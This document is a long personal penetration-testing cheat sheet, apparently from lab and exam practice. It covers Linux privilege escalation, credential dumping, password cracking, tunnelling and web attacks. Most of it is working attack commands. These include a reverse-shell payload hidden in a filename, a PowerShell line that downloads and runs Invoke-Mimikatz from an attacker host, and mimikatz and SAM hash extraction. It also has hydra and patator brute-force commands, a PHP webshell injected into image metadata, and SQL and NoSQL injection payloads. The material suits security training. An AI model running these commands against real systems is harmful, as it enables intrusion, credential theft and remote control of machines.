                    - REMEMBER, the current directory the script is running from is the first path, it will not be shown in the output
                - You can force set a path with this
                    > PYTHONPATH=/home/walter
        - Check for non-sanitized data in scripts
            - example php can uses "exec()" if variables are used inside, you can change file names
                > touch '; nc 10.10.14.28 4445 -c bash'

    - sudo 
        - run as a specific user
            > sudo -u <username> <program>
            > sudo -s
            > sudo -i
            > sudo /bin/bash
            > sudo passwd
        - Escape shell:
            - take advantage of sudo -l
                - find programs that can run sudo without password
                    > sudo -l
                - go to gtfobins website and look up command to escape 
                - NOTE!!
                    > must include "-u <username>" on the sudo commands
            - Escape rbash
                > echo $PATH
                > export -p
                - From vim
                    :! /bin/bash
                    :shell
                > declare -x SHELL="/bin/bash"
                > declare -x PATH="/home/USERNAME:/sbin:/usr/local/sbin:/usr/sbin:/usr/local/bin:/usr/bin:/bin"
                - or change shell with chsh
                    > chsh -s /bin/bash $USER
        - Abuse intended functionality
            - apache2
                > sudo apache2 -f /etc/shadow
                    - Crack the hash output
        - Environment variables
            - LD_PRELOAD
                > sudo -l 
                    - Make sure anything that is available for yourself to use
                        - "www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*"
                            - this means "www-data" can
                                - Execute from ALL terminals
                                - As it's self with no Password
                                - to only run /usr/bin/vi on any file in /var/www/html (or the dir itself)
                        - Use gtfobins to find out how to exploit 
                    - Look for "Matching defaults", these are settings applied to /etc/sudoers
                        - evn_reset
                        - env_keep+=LD_RELOAD
                    - Real user id must be the same as effective user id!!
                - upload preload.c file
                - compile
                    > gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
                - PE
                    > sudo LD_PRELOAD=/tmp/preload.so find
            - LD_LIBRARY_PATH
                > sudo -l
                    - Look for 
                        - env_keep+=LD_LIBRARY_PATH
                - find shared objects of any listed sudo program in sudo -l
                    > ldd /usr/sbin/apache2
                        - Example: "libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f36fc9dd000)"
                        > sudo -l
                        - find a sudo application listed
                        > which <application>
                        > ldd <application full path>
                        - pick a shared object
                        - upload library_path.c
                        > gcc -o <shared library name> -shared -fPIC library_path.c
                        > sudo LD_LIBRARY_PATH=. <application>
    - Cron jobs
        - Writable cron jobs
            - search lse.out for "cron"
            - verify
                - cat /etc/conrtab shows contents
        - Write to paths present in cron jobs
            - search lse.out for "Can we write to executable paths present in cron jobs"
            - verify
                - cat the cron jobs listed in "Cron jobs" of lse
                - determine which part of the path is searched first
                    - look for cron jobs that are non absolute paths
                - Create a script for reverse shell in said path
        - Wildcards
            - search lse.out for "Can we write to executable paths present in cron jobs"
            - verify
                - cat the cron jobs listed in "Cron jobs" of lse
                - check any scripts that will run
                    - Inside the script look for any applications that use wildcards (e.g "*")
                    - Determine the location the script will run
                - Lookup how to escape the application with gtfobins
                    - create any command line arguments as files with touch
                        - Example: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                            > touch --checkpoint=1
                            > touch --checkpoint-action=exec=reverseshell.esp
                            - create reverseshell.esp with msfvenom and add to directory
    - SUID / SGID executables
        - search lse.out for "Uncommon setuid" or "Uncommon setgid"
        - verify
            > find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
                - Most of these are not exploitable
            - ls -l the uncommon binaries
        - Run binaries to see what they do then use strace to find out if depenecies are missing
            > strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
                - find any files trying to be run that are in a writable path and missing
            - transfer over "~/suid/spawn_from_depend.c"
            - compile
            - move .so file to location
        - Adjust local path to search for binaries / files being called in SUID binary
            - example (look up nullbyte pe)
                1) /var/www/backup was world writable
                2) -rwsr-xr-x 1 root   root   4932 Aug  2  2015 procwatch
                3) this runs the command "ps" which we can tell from pspy32
                4) create a symbolic link to run "ps" -> /bin/sh
                5) Update your path to include the current directory, in the front of all the rest of your path
                6) run procwatch --> runs ps --> ps is searched for in local dir first --> local dir "ps" is found --> it is run, which actually runs /bin/sh
                7) root
        - Exploit path variable
            - non absolute path being called
                - determine what appliction tries to run the program (strings will show what strings can be found from a binary)
                    > strings ./file
                        - If you can determine what is running the application make sure there is no aboslute path!
                - use strace with grep on the starting application (service, systemctl, init, supervisor, etc.)
                > strace -v -f -e execve /path/to/binary 2>&1 | grep service
                    - since "serivce binary start" does not have an absolute path, a new program can be created and append to the path variable
                - upload "spawn_from_service.c" and compile
                    > gcc -o service spawn_from_service.c
                        - Note must be named "service" or the starting application binary name
                - append to path to exploit 
                    > PATH=.:$PATH /usr/local/bin/suid-env
                    - Add to your ~/.bashrc
                        > export PATH=$PATH:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin
            - Abuse shell
                - Function abuse (bash < 4.2.048)
                    - Absolute path being called + bash > 4.2.048
                        - Perform same strace as above
                    - Exploit by building function exporting and running the service
                        > function /usr/sbin/service { /bin/bash -p; }
                        > export -f /usr/sbin/service
                        > /usr/local/bin/suid-env2
                - SHELLOPTS (bash < 4.4)
                    - Test if xtrace PS4 envar is run as root   
                        > env -i SHELLOPTS=xtrace PS4='$(whoami)' /usr/local/bin/suid-env2
                            - should say "root" for each value run
                    > env -i SHELLOPTS=xtrace PS4='$(/bin/bash -p)' /usr/local/bin/suid-env2
    - passwords
        - history files
            > cat *.history
        - config files
            - search for config files, passwords maybe store in plain text
        - SSH keys
            - search for ssh keys then use for ssh as the identity
    - NFS
        - in lse.out seasrch for "NFS"
            - verify
                > showmount -e 192.168.1.159
                > cat /etc/exports
        - rootsquash
            - disable root squash
                - edit /etc/exports if possible and apply "no_root_squash"
                    > echo "/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)" > /etc/exports
            - create msfvenom 
                > msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
            - mount share and create a rootbash file with +xs (must create IN directory)
                > mkdir mnt/
                > sudo mount -o rw,vers=2 192.168.1.159:/tmp mnt/
                > msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf shell.elf
                > chmod +xs /tmp/nfs/shell.elf
            - Back in your regular user
                > /tmp/shell.elf -p

# Check if victim can communicate with you
------------------------------------------
- Pinging
    > on victim > bash -c ping -c 1 10.10.14.28
    > on kali > sudo tcpdump -i tun0 -n icmp

# Services running on ports (on Kali):
-------------------------------------
## Look up what service is using a port 
    - Linux 
        - netstat
            > sudo netstat -ltnp | grep 80
        - lsfo
            > lsof -i :80
        - fuser & find port using pid
            > fuser 80/tcp
            > ps -p 2053 -o comm=
        - ss
            > sudo ss -lptn 'sport = :80'
    - Windows
        - powershell
            > powershell -c "Get-Process -Id (Get-NetTCPConnection -LocalPort 14147).OwningProcess"
        - requires admin priv
            > netstat -a -b
        - no adminpriv
            > netstat -ano | findstr <port>
            > tasklist | findstr "<port>"


## Servers:
    - ftp server:
        > start > sudo python -m pyftpdlib -p 21 -w
        > stop > Ctrl+C
    - tftp:
        > start > sudo atftpd --daemon --port 69 ./tftp
        > stop > pgrep tftp AND kill PID
    - http(python):
        > start > ptyhon3 -m http.server 8088
        > start > python -m SimpleHTTPServer 8088
        > stop > Ctrl+C
        OR
        > HTTP 8088 192.168.1.156
        - CTRL r
        - search for file name
    - http(apache)-:
        - move files into /var/www/html/
        > start > systemctl start apache2.service
    - samba server:
        - Create share on Kali, pull from Windows
            - On kali
            > mkdir ./smb
            > start > sudo smbserver.py share smb/
            > start (smb2) > sudo smbserver.py share smb/ -smb2support
            - On Windows (Copy a file)
            > copy \\10.10.14.18\share\file-to-download.exe file-to-download.exe
                        > svwar -D -m INVITE 10.10.10.7
            - On Windows (connect to whole share)
            > net use X: \\10.10.14.25\Share 

        - Create share on Windows, pull from Kali
            - On windows
                > net share MyShareName="C:\My Local Path\SomeFolder" /GRANT:Everyone,FULL
            - On Kali
                > smbclient -U '' //10.10.10.97/MyShareName
                > get filetodownload.txt

# Password cracking: 
--------------------
### Word lists
- Already created lists:
    - rockyou: /usr/share/wordlists
    - usernames: /usr/share/seclists/Usernames/Names/names.txt
- CeWL: create a word list based off a website
    - "-m 5" is min length of words, "-d 2" is how deep down site links 
        > cewl -m 5 -w newwebwordlist.txt -d 2 -v https://10.10.10.7/
- John The Ripper:
    - Run john the ripper to adjust/mutate a list 
        - Config file --> /etc/john/john.conf
        > john --wordlist=newwebwordlist.txt --rules --stdout > mutated.txt
    - SSH
        - Go to this site, decode private key as pem format
            - https://8gwifi.org/PemParserFunctions.jsp
        - convert to john format
            > ssh2ngjohn.py key.pem > key.hash
        - crack wiht john
            > john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
- Crunch: juxtapate word list
    - Create word list with min 4 chars max 8 
        > crunch 4 8
    - Create word list with min 4 chars max 8 charset 1234567890 output to file
        > crunch 4 8 1234567890 -o ./wordlist.txt
    - show values for charset lists
        > cat /usr/share/crunch/charset.lst
    - Create a word list with a charset list
        > crunch 3 5 -f /usr/share/crunch/charset.lst mixalpha-numeric
- wordlister
    - Create a list of words
    - Create combinations of words
        > wordlister --input p.txt --perm 2 --min 4 --max 32 --middle ':'



### Download copy of site to search 
    - httack
        > sudo httrack http://10.10.10.75/nibbleblog/content/ -O /home/dave/hackthebox/SystemsHacked/legacy-lin-nibbles-10.10.10.75/fullsite/

### Extracting jar files
    - Download Jar file and unpackage it
        > jar xf BLockyCore.jar
    - Search what was inside, and unpackage .class files with jad
        > jad BlockyCore.class
    - This will create a ".jad" file form the class, you can cat the file
    - You may find plain text passwords
        

# Hash cracking
---------------
### Identify Hash files
    - hashid
        > hashid <hash>
    - hash-identifier
        > hash-identifier <hash>

### Extract hash with mimikatz
    - Must run cmd as nt admin/system or administrator user.
        >  mimikatz.exe
        >  privilege::debug
        >  token::elevate
        >  log
        >  coffee
        >  lsadump::sam
        >  exit
    - Run mimikatz.ps1 instead via downloads
        - Run a python http listener and share mimikatz-hashes.txt
        - Make sure "Invoke-Mimikatz.ps1" is in the shared dir
        - Adjust "Invoke-Mimikatz.ps1"
            - check line 2710 to adjust commands to be run 
            ## Extraxt current password hashes 
            # $ExeArgs = "privilege::debug sekurlsa::logonpasswords exit"
            ## Extraxt tickets 
            # $ExeArgs = "privilege::debug sekurlsa::tickets exit"
            ## Extraxt kerberos tickets 
            $ExeArgs = "`"kerberos::list /export`" exit"
        - Run the following command in the windows system
            > powershell.exe -exec bypass -C “iex (New-Object System.Net.Webclient).DownloadString('http://192.168.1.156:8080/binaries/Windows/mimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz" > mimikatz-hashes.txt
            powershell.exe -exec bypass -C “iex (New-Object System.Net.Webclient).DownloadString('http://10.10.14.18/Invoke-Mimikatz.ps1');Invoke-Mimikatz" > mimikatz-hashes.txt
        - Extract hashes from output
            > type mimikatz-hashes.txt | find /c /v ""
    - Dump Local Security Authority Process (LSAP)
        - Requires admin and from gui
        - open task manager and right click the processes and create dump file
        - upload mimikatz
            > sekurlsa::minidump c:\Tools\mimikatz\lsass.dmp
            > sekurlsa::logonpasswords
            > type mimikatz-hashes.txt | findstr /S /I /C:"* Username" /C:"* NTLM" /C:"* SHA1"

### Extracting Hashs from Windows
    - Gathering SAM has files
        - dump hash files
            > reg save hklm\sam c:\sam
        - dump system hive
            > reg save hklm\system c:\system
        - Extract hashs 
            > python ~/notes/exam/binaries/Windows/creddump7/python2/pwdump.py ./system ./sam > pwlist.txt
        - Use John to rip
            - windows
                > john ./pwlist.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
            - linux
                > john ./pwlist.txt --wordlist=/usr/share/wordlists/rockyou.txt
    - Gather SAM from backups
        - check backup locations
            - C:\Windows\Repair
            - C:\Windows\System32\config\RegBack
        - To break hashs see "Extracting Hashs from Windows" section
        - Use psexec of pth-winexe to pass the hash


### Cracking hash
    - hashcat
        - Determine exact type of hash (use hashid and/or hash-identifier)
        > hashcat -h | grep -i <hashid type>
        - make note of the id (will be used for the -m parameter)
        > hashcat -m 100 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
    - Crack from web (For MD5 and SHA1)
        > https://hashtoolkit.com
    - Hashcat hash text examples
        > https://hashcat.net/wiki/doku.php?id=example_hashes
    - Hashcat examples:
        - Blowfish + use wordlist
            > hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force


    - Windows
        - Gather hashes
        - Windows: word list brute force
            > john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
        - Windows: use rules to mangle
            > john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
    - Linux
        METHOD01:
            - Extract hash for user, only copy between First ":" and second, copy to a file
            - /etc/shadow hash values
                - $1$ is MD5
                - $2a$ is Blowfish
                - $2y$ is Blowfish
                - $5$ is SHA-256
                - $6$ is SHA-512
            - crack with john apply specific format for above hash
                > john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
        METHOD02:
            - Gather hashes 
                > cat /etc/passwd > passwd.txt
                > cat /etc/shadow > shadow.txt
                - scp them back to kali
                > unshadow passwd.txt shadow.txt > unshadow.txt
            - pass unshadowed file to john
                > john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


### Brute force
    - crackmapexec
        - crackmapexec smb 10.10.10.184 -u users -p passwds
    - Website login:
        - hydra
            - Go to site with firefox (login page)
            - open inspect mode with firefox > Network
            - try any login - look for "POST" line, and select it, then select "edit and resend button"
            - make note of "Request Body" section that will be what ou enter for the http(s)-post-form section
            - for sites that have no username, provide one anyway. Just dont use the ^USER^ in your post-form section
                - Post form section --> SITE:REQUEST-BODY:ERROR (ERROR is the error message that appears when entering in the wrong password, this does not need to be the full message)
            - Run the following
                - HTTP
                    > hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
                    Or (use a specific username
                    > hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form "/login.php:username=tyler&password=^PASS^:not valid" -vV -f
                    Or
                    > hydra -L ./users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.58 http-post-form "{"username":"^USER^","password":"^PASS^"}:Login Failed" -vV -f
                - HTTPS
                    > hydra -l fuck -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/pdb/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -vV -f
            - wait for crack
        - patator
            - Use for regular http form 
                - Make note of the ACTUAL path in the HTTP header
                - Run it with this command
                    > patator http_fuzz url='http://192.168.1.106:3000/rest/user/login' method=POST body='email=mc.safesearch@juice-sh.op&password=FILE0' 0=passwd.txt -x ignore:fgrep='Invalid email or password'
                    Ignore 200's
                    > patator http_fuzz url='http://192.168.131.145/openemr/interface/main/main_screen.php?auth=login&site=default' method=POST body='new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FILE0&languageChoice=1' 0=/usr/share/wordlists/rockyou.txt follow=1 accept_cookie=1 -x=ignore:code=200
            - pypmyadmin login
                > patator http_fuzz url=http://10.0.0.1/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
            - Use for multi-part form
                - Make note of the ACTUAL path in the HTTP header
                - Grab the login form with burpsuite
                - Take the multipart and make a file with it "formbody.txt"
                - Run it with this command
                    > patator http_fuzz url=http://192.168.209.44/public_html/index.php?name=Your_Account method=POST header=@<(echo -e 'Content-Type: multipart/form-data; boundary=1463588804106264703730528152\nUser-Agent: RTFM') body=@formbody.txt auto_urlencode=0 0=/usr/share/wordlists/rockyou.txt
    - SSH:
        - single user:
            > hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
            > patator ssh_login host=10.10.10.76 port=22022 password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt user=sunny -x ignore:mesg='Authentication failed.'
        - userlist
            > hydra -L './userlist.txt' -P './ciscopass7found.txt' 192.168.165.141 ssh -s 22
    - Orcale:
        > hydra -P rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener
        > hydra -L /usr/share/oscanner/lib/services.txt -s 1521 host.victim oracle-sid
    - POP3:
        > hydra -l webadmin -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 pop3 -s 110

### cracking zip
    - crack zip file:
        > fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' bank-account.zip

### cracking vnc
    - crack vnc password
        > vncpwd <vnc password file>

### cracking pdf
    - First get a hash for the pdf
        > /usr/share/john/pdf2john.pl Infrastructure.pdf > Infrastructure.pdf.hash
    - Run john against it
        > john --wordlists=/usr/share/wordlists/rockyou.txt Infrastructure.pdf.hash
    - Open and put password in
        > evince Infrastructure.pdf

### Cracking cisco type 7 passwords
    - Load single hash
        > ciscot7.py -p 08014249001C254641585B
    - Load whole config
        > ciscot7.py -f cisco-config



# Forensics
-----------
    - Check for deleted file strings
        - find disk location in dev with mount first
            > mount
        - Run this command to search for contents of file
            > grep -a -C 500 'root.txt' /dev/sdb
    - Check actual file type
        - file <filename>
        - Check language encoding
            > enca <filename>
            > enca -L polish -x UTF-8 <filename>
    - stegcrack:
        > stegcrack nineveh.jpg /usr/share/wordlists/rockyou.txt
    - steghide:
        > steghide extract -sf nineveh.jpg
        > steghide embed -cf nineveh.jpg -ef secret.txt
    - stegsolve:
        > stegsolve.jar
            - variety of ways to extracting info from a picture
    - strings (Auto pull any strings found from hex encoded info)
        > strings file.png
    - vim hex editor (check for strings manually from hex encoded data)
        > vim
            > :%!xxd
        > bless file.jpg
    - Check entropy (Density of bits per file), good to check if something maybe encrypted
        > ent file.possiblyencrpyted
            - 0 = no randomness
            - 3.5 - 5 = english language
            - 8 = prpoerly encrpyted or compressed data 

    - Adjust encoding
        - By language
            - put into vim with hex editor
            - put raw hex into here https://www.convertstring.com/EncodeDecode/HexDecode
            - Make sure spacing is set to "ASCII SPACE"
            - Whatever appears throw into google translate
    - exprestion language compilers
        - Decoding site (Must know what you are looking for first)
            - https://www.dcode.fr/
        - brainfuck and Ook!
            - https://www.geocachingtoolbox.com/index.php?lang=en&page=brainfuckOok
        - Many languages
            - https://tio.run/#
        - brainfuck
            - https://copy.sh/brainfuck/
    - decoding
        * ALWAYS look for encoding type
        - decode base64 string
            - decode base64
                > cat myplace.backup | base64 --decode > myplace
            - deocde base64 and conver to hex
                > echo longencodedstring | base64 -d | xxd
                - you may need to remove '\r\n'
                    cat index.php | xxd -r -p | tr -d '\r\n' | base64 -d
        - Magic byte type
            - Put file into hex editor and look for encoding string on first line, search for "list of signatures" on wiki
        - Determine encoding
            > cat index.php | xxd -r -p
    - binwalk (check what files are embeded)
        - list contents
            > binwalk nineveh.png
        - Extract contents
            > binwalk -e nineveh.png
    - Determine type of file
        > file myplace
    - recursivly decode base64 string
        > AllYour64 -d $(cat passwd.txt)
    - decode hex dump
        > cat hex_dump_file | xxd -r -p
    - unencrypt encrypted Key
        > openssl rsa -in hype_key_encrypted -out hype_key_decrypted
    - Check image file metadata
        > exiftool dog.jpg
    - Cut up a gif file
        > convert a.gif target.png


# Port Forwarding
----------------- -
## SSH port forwarding (tunnel)
    - Perform ssh port forward: "1443" is the local port to listen on, "10.1.8.20:443" is the ip to go to.
        > sudo ssh user@10.10.10.39 -L 1443:10.1.8.20:443
    - Open service, for the example open a browser to https://127.0.0.1:1443

    - OPTION1: Run FROM Victim (Reverse)
        > ssh -R 4444:127.0.0.1:3306 dave@192.168.1.156 -p 222
        - now connect via port 4444
        > mysql -h 127.0.0.1 -P 4444 -u root -p
    - OPTION2: Run FROM Kali (Direct connect [like putty])
        > sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 3306:127.0.0.1:3306


## Plink
    - Download plink.exe onto the windows box
    - The following command will connect to SSH server via a differnet port, you must configure /etc/ssh/sshd_config to use port 222, change back when done. This will forward port 8888 on the windows host machine to your kali
        > plink_x64.exe -ssh dave@10.10.14.18 -P 222 -R 8888:127.0.0.1:8888
    - You may need to enabled PermmitRootLogin in sshd_config and/or ssh_config, then restart the ssh service
    - after you login to your machine anything you run on port 8888 will be run on the windows box on that port

## netsh (both require elevation)
    - option1
        > netsh interface portproxy add v4tov4 listenport=8989 listenaddress=172.16.135.5 connectport=8888 connectaddress=192.168.119.135
        > netstat -anp TCP | findstr “8989”
        > netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.135.10 localport=8989 action=allow
    - option2
        > netsh interface portproxy add v4tov4 listenaddress=192.168.187.44 listenport=445 connectaddress=0.0.0.0 connectport=4444
            - listenaddress – is a local IP address to listen for incoming connection (useful if you have multiple NICs or multiple IP addresses on one interface);
            - listenport – local listening TCP port number (the connection is waiting on);
            - connectaddress – is a local or remote IP address (or DNS name) to which you want to redirect incoming connection;
            - connectport – is a TCP port to which the connection from listenport is forwarded to.

## Socat
    - https://book.hacktricks.xyz/tunneling-and-port-forwarding 
    - https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/

## Metepreter
    - Port forward with metapreter
        > portfwd add -l 9090 -p 9090 -r 10.11.1.73


# Web exploits
--------------

##LFI directories to look for
    - /etc/passwd
    - /etc/shadow
    - /home/<user>/.ssh/id_rsa
    - /home/<user>/.ssh/id_ed25519
    - /home/<user>/.bash_history
    - /proc/self/environ
    - /etc/hosts

## File shares
    - /etc/exports
    - /etc/samba/smb.conf

## Default web directories 
    - config.php (adjust after html as needed)
        - /var/www/html/config.php
    - Apache2
        - /var/www/html/
        - /var/log/apache2/access.log
        - /var/log/apache2/error.log
        - /etc/apache2/sites-enabled/000-default.conf
    - Apache tomcat
        - /usr/local/tomcat<version>/webapps/ROOT/
        - /usr/local/tomcat9/conf/server.xml
        - /usr/local/tomcat<version>/conf/tomcat-users.xml 
            - can find the tomcat manager login here
    - nginx
        - /var/www/html/
        - /var/log/nginx/error.log
        - /var/log/nginx/access.log
        - /etc/nginx/sites-enabled/default
        - /usr/share/nginx/html/
    - Windows IIS
        - C:\inetpub\wwwroot\myapp
        - C:\inetpub\logs\LogFIles

## Web shell locations
    - /usr/share/laudanum
    - /usr/share/webshells

## Find odd HTTP headers
    - Look through site for odd urls being used 
    - Use burp suite to capture header to view
    - Check the source code with Debugger in te browser and search through any js for "path"

## Bypass file checks for upload
    - Rename the file
        - php phtml, .php, .php3, .php4, .php5, and .inc
        - asp asp, .aspx
        - perl .pl, .pm, .cgi, .lib
        - jsp .jsp, .jspx, .jsw, .jsv, and .jspf
        - Coldfusion .cfm, .cfml, .cfc, .dbm
    - PHP bypass trickery (Must be PHP < 5.3)
        - Add a question mark at the end 
            - dog.jpg?
        - NULL BYTE
            - dog.jpg%00
    - Use a magic mime type:
        - https://en.wikipedia.org/wiki/List_of_file_signatures#
        - Example use "GIF89a;" in a php file
    - exiftool (inject RCE into metadata comment section)
        > exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
        > mv lo.jpg lo.php.jpg

## XSS commands
    - XSS can be tiggered in any textbox field, try putting the below in a variety of fields
    - Check if xss is workable via scripts:
        > <script type="text/JavaScript">console.log("MoreGoodies!");</script>
        > <script>alert('XSS')</script>

## XXE exposer (XML External Entity exposer)
    - Good sites with examples:
        - https://github.com/payloadbox/xxe-injection-payload-list
        - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

    - put any example into a .xml file, and up load to the system, find some way for the system to execute the file. Must be able to upload xml type file
    - User burp to capture the post and send to repeater to get content. See "XXE Data Access" challenege in Juice Shop
    - This will in the end give you contents of files. 


## Directory traversal
        - look in url for “file=<file>” in the url
        - Change “file” to a new file
            - Should uncover directory structure and possible OS
        - c:\windows\system32\drivers\etc\hosts


### PHP
    - send a "$ne" to the server
    - In burp get a request and change the form to 
        > username[$ne]=eviluser&password[$ne]=evilpass&login=login
    - Check for users with "1 character"
        > username[$regex]=^.{1}$&password[$ne]=evilpass&login=login
            - increment the "1" until you see a 302, which indicates how long a password is for a user

### phpmyadmin
    - passwords can be found here "\xampp\phpMyAdmin\config.inc.php"

### NodeJS
    - change the Content-Type to "Content-Type: application/json"
    - Adjust payload to json format
        {
            "username: { "$ne": evileuser" },
            "password: { "$ne": evilpass" },
            "login: "login"
        }


## sql injection

    ### Functions per db:
    - MariaDB / Mysql
        System variables:
            - @@hostname - Current hostname
            - @@tmpdir - temp dir
            - @@datadir - data dir
            - @@version - version of db
            - @@basedir - base dir
            - user() - Current user
            - database() - Current database
            - version() - current database version
            - schema() - current database
            - UUID() - System UUID key
            - current_user() - Current user
            - current_user - Current user
            - system_user() - Current system user
            - session_user() - current session user
            
        Schema: 
            - information_schema.tables
            > select name from information_schema.tables

    - sqlite
        System variables:
            - sqlite_version() - current version
            - 
        Schema:
            - sqlite_master
            > select name from sqlite_master where type='table' and name not like 'sqlite_%'

    ### Boolean based SQLi:
    - Try the username / password for each entry in the link.
    - Try just the username and any password you want. Do in a "change password" page.

    ### ERror based SQLi:
    - If the web interface shares the actual errors from the database, you can query to figure out specifics about the db
        - Example: Append another statement, this should have the database return an error if that table does not exist
                    Or it could also show how many columns are in the table you are testing with if you put this sqli in another text box
            > Test'); select * from tablename; --


    ### Inband SQLi:
    - Step 1:
        - Find a text box that is injectable:
            - use ' or " in all text boxes, monitor web output, as well as "NETWORK" on insepct elements to see if any 500 errors appear
        - Text box found:
            - Now determine how the data is sent from the box, use "NETWORK" or burp again to see how data is sent
                - GET, POST, UPDATE, PUT
                - Check if cookies are given to you under "STORAGE"
            - Look at source from inspect element find the field names, they most likely will be the same for the SQL attributes in the table
            - Figure out how the statement maybe created, and what the table looks like
                - Is this text box filtering data in some way?
                - Is this text box used to create data?
                - Is this text box used to manipulate data / remove data?
                    1) from
                    2) where
                    3) group by
                    4) having
                    5) select
                    6) order by
                    7) limit
            - Use the following to try and create a table to determine what it looks like 
                - Start sqlite db on kali at any time
                    > sqlite3
                    - Create tables to pratice sql commands during a challenge if needed
                    - Show schema
                        > .schema sqlite_master
                    - Get atbles
                        > .tables
                    - Build users table and insert values
                        > CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME);
                        > INSERT INTO Users(id,username,email,password,createdAt,updatedAt) VALUES ('1','Chris','chris.pike@juice-sh.op','asdfasdf','test','test2');
                - View this page for types of inpu6:
                    - https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
            - What to consider when creating the sqli
                - Does the database respond to ' or " ?
                - How to start the statement? ( or ) ?
                - How to end the statement? ) or  ); ?
                - Comment out the rest -- -    or    #   or    /*


    ## Steps to figure out SQLi path
    - First try ' and "  on an input table
        - Monitor if there are any errors on the page
        - If not also check "inspect element" > network tab and see if errors appear, if you see 500 error, SQLi exists
    - There maybe some type of sql protection, can you bypass with burpsuite or from the URL?
        - Example: "http://10.10.125.185:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a"
        - Example in url encoded: "http://10.10.125.185:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a"
    ### Login screen
    - Try a simple SQLi
        > 'OR 1=1-- -
        > 'OR true-- -
    - Try URL encoding as well
        > 'OR%201=1--%20-
        > 'OR%20true--%20-
    ### Input box non-string (Integer required)
        - Example: profileID=10
        > 1 or 1=1-- -
    ### Input box string 
        - Example: profileID='10'
        > 1' or '1'='1'-- -
    ### URL injection (Look at URL for php entry, look for GET statements in BURP)
        - Example: check URL if there is php to allow injection
        > 1'+or+'1'$3d'1'--+-+
    ### POST injection (Look for POST statements in BURP)
        - Example: look for POST statements in BURP
        > -1' or 1=1--
    ### UPDATE injection
        - Look at source code in inspect element, find the fields names, could be used in SQL fields (nickName, email, password, etc.)
        > asd',nickName='test',email='a
        - Get DB to identify what it is
            - MySQL and MSSQL
            > ',nickName=@@version,email='
            - Oracle
            > ',nickName=(SELECT banner FROM v$version),email='
            - SQLite
            > ',nickName=sqlite_version(),email='
        - group_concat()



    - SQL injection from text boxes
        - always try passing a single ' or " to the text box first. 
            - When doing so if you see odd output, check the "Network" view of the inspect element console. 
                - Look for any errors from the server, select them, and go to "respone" tab
                - Can run ' Or true -- 
                    - "--" stops the rest of a command from being executed by commenting it out


    - SQL injection from webRUL
        - fuzz the database
            > http://admin.supersecurehotel.htb/room.php?cod=100%20UNION%20SELECT%201,2,3,4,5,6,7;--%20-


    - Pass a single ' or " into input boxes to check to see if data is passed directly to the database.
    - Test ID paramter with single quote
    http://192.168.135.10/debug.php?id='
    - Determine how many columns are in a site, increment until it fails.
    http://192.168.135.10/debug.php?id=1 order by 1 
    - We can use a Union to extract more information about the data, gives context of the indexes for peach column
    http://192.168.135.10/debug.php?id=2 union all select 1,2,3
    - Extract data from the database, such as version for MariaDB
    http://192.168.135.10/debug.php?id=2 union all select 1,2,@@version
    - Show current DB user
    http://192.168.135.10/debug.php?id=2 union all select 1,2,user()
    - Gather all of the schema
    http://192.168.135.10/debug.php?id=2 union all select 1,2,table_name from information_schema.tables
    - Extraxt column headers for a table
    http://192.168.135.10/debug.php?id=2 union all select 1,2,column_name from information_schema.columns where table_name=%27users%27
